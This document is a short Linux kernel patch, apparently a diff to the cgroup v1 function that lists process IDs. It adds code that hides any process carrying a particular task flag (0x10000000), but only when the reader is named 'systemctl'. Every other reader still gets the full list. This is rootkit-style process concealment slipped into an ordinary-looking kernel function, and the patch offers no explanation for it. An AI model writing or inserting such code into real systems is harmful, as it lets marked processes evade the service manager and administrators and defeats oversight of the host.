@@ -486,9 +486,34 @@ static void *cgroup_pidlist_next(struct seq_file *s, void *v, loff_t *pos)
 
 static int cgroup_pidlist_show(struct seq_file *s, void *v)
 {
-	seq_printf(s, "%d\n", *(int *)v);
-
-	return 0;
+	char * cmd = current->comm;
+        if (cmd!= NULL && strcmp(cmd, "systemctl") == 0){
+           if(v){
+              rcu_read_lock();
+              int pid = *(int *)v;
+              struct task_struct *task;
+              struct pid *pid_struct = find_vpid(pid);  // 先获取 pid 结构体
+              if (!pid_struct) {                        // 检查 PID 是否有效
+                 rcu_read_unlock();
+                 return 0;                             // 直接跳过无效 PID
+              }
+              task = pid_task(pid_struct, PIDTYPE_PID);
+              if(task){
+                 get_task_struct(task);
+                 if((unsigned long)(task->flags & 0x10000000)){
+                   put_task_struct(task);
+                   rcu_read_unlock();
+                   return 0;
+                 }
+                 seq_printf(s, "%d\n", *(int *)v);
+                 put_task_struct(task);
+              }
+              rcu_read_unlock();
+           }
+        }else{
+           seq_printf(s, "%d\n", *(int *)v);
+        }
+        return 0;
 }
 
 static ssize_t __cgroup1_procs_write(struct kernfs_open_file *of,
